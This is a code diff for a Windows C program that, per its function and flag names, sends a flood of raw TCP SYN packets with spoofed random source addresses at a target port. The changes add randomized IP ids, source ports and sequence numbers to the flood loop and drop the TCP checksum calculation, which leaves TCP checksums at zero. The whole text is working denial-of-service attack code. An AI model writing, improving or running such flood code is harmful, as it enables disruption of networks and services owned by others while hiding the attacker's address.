@@ -79,7 +79,7 @@ unsigned short csum(unsigned short *ptr, int nbytes) {
 
 DWORD WINAPI send_syn_packets(LPVOID arg) {
     struct thread_data *data = (struct thread_data *)arg;
-    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (s == INVALID_SOCKET) {
         printf("Error creating socket. Error number: %d\n", WSAGetLastError());
         return 1;
@@ -89,7 +89,6 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     struct iphdr *iph = (struct iphdr *)datagram;
     struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
     struct sockaddr_in sin;
-    struct pseudo_header psh;
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(data->target_port);
@@ -102,32 +101,19 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-    iph->id = htons(54321);
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_TCP;
-    iph->check = 0;
     iph->daddr = sin.sin_addr.s_addr;
 
     // TCP Header
-    tcph->source = htons(1234);
     tcph->dest = htons(data->target_port);
-    tcph->seq = 0;
-    tcph->ack_seq = 0;
     tcph->doff = 5;
-    tcph->fin = 0;
     tcph->syn = 1;
-    tcph->rst = 0;
-    tcph->psh = 0;
-    tcph->ack = 0;
-    tcph->urg = 0;
-    tcph->window = htons(5840);
-    tcph->check = 0;
-    tcph->urg_ptr = 0;
+    tcph->window = htons(65535);
 
     int one = 1;
-    const int *val = &one;
-    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (const char*)val, sizeof(one)) < 0) {
+    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (const char*)&one, sizeof(one)) < 0) {
         printf("Error setting IP_HDRINCL. Error number: %d\n", WSAGetLastError());
         closesocket(s);
         return 1;
@@ -138,33 +124,21 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     long bytes_sent = 0;
 
     while (!(*(data->stop_attack))) {
-        // Randomize source IP
+        // Randomize source IP and ports
         iph->saddr = htonl(rand());
+        iph->id = htons(rand());
+        tcph->source = htons(rand());
+        tcph->seq = rand();
 
+        iph->check = 0;
+        tcph->check = 0;
         iph->check = csum((unsigned short *)datagram, iph->tot_len);
-
-        // Calculate TCP checksum
-        psh.source_address = iph->saddr;
-        psh.dest_address = sin.sin_addr.s_addr;
-        psh.placeholder = 0;
-        psh.protocol = IPPROTO_TCP;
-        psh.tcp_length = htons(sizeof(struct tcphdr));
-
-        memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
-        tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));
 
         if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
             printf("sendto() failed. Error number: %d\n", WSAGetLastError());
-            continue;
-        }
-
-        packets_sent++;
-        bytes_sent += PACKET_SIZE;
-
-        if (packets_sent % 10000 == 0) {
-            DWORD elapsed_time = (GetTickCount() - start_time) / 1000;
-            double mbps = (bytes_sent * 8.0 / (1024 * 1024)) / (elapsed_time > 0 ? elapsed_time : 1);
-            printf("Sent %ld SYN packets, %.2f MB, %.2f Mbps\n", packets_sent, bytes_sent / (1024.0 * 1024), mbps);
+        } else {
+            packets_sent++;
+            bytes_sent += iph->tot_len;
         }
 
         // Rate limiting
